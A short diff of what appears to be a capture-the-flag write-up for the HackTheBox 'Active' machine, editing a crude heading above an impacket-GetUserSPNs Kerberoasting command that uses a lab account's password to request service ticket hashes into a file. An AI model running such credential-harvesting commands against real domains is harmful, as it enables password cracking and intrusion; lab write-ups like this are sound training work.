@@ -179,7 +179,7 @@ To force the tool to download the actual ticket hash structure to your machine, 
 
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.76.174 -request -outputfile hashes.kerberoast
 
-LETS READ DAT HOE:
+LETS READ that thing*:
 cat hashes.kerberoast
 
 WE GET THIS:
